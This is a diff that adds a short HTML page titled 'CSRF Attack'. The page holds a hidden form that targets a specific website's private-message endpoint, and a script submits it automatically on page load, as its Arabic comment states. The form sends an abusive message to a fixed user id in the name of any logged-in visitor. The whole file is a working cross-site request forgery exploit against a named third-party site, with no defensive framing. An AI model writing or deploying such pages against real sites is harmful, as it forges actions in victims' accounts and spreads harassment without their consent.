@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <form action="https://www.qorsanalmaarefa.com/players/newPrivateMessage" method="POST" id="csrf-form">
+        <input type="hidden" name="friend_id" value="2475">
+        <input type="hidden" name="message" value="fuck you">
+    </form>
+    <script>
+        // إرسال الطلب تلقائيًا عند فتح الصفحة
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
